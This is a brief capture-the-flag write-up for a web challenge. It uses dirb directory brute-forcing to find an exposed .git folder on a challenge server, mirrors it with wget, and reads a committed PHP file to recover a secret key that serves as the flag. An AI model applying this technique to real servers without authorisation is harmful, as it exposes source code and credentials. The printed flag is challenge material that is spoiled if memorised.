## Maximum Courage  

### The Problem:

> Max prefers to learn by practicing and not just reading all day, so he set up a webserver and hopes it stays secret, can you prove it has a weakness?  (http://35.197.204.100/maximum/)

### The Solution:

- `dirb http://35.197.204.100/maximum/`:  
  > ...
  > + http://35.197.204.100/maximum/.git/HEAD (CODE:200|SIZE:23) 
  > ...
  
- `wget --recursive  http://35.197.204.100/maximum/.git/`  
- `git show flag.php`:  
```
commit ca432659ef19b8e1cfd6607878c4eb5a778dc37d
Author: max <git@max.com>
Date:   Sat Feb 23 15:30:44 2019 +0200

    First commit

diff --git a/flag.php b/flag.php
new file mode 100644
index 0000000..f3df28f
--- /dev/null
+++ b/flag.php
@@ -0,0 +1,7 @@
+You can't view this flag directly.
+<!-- PHP source doesn't appear on HTML comments -->
+<?php
+exit();
+die();
+$secret_key = 'be607453caada6a05d00c0ea0057f733';
+?>
\ No newline at end of file
```

- `echo -n be607453caada6a05d00c0ea0057f733 | wc -c` -> 32 -> possibly md5

### The flag: 
`be607453caada6a05d00c0ea0057f733`




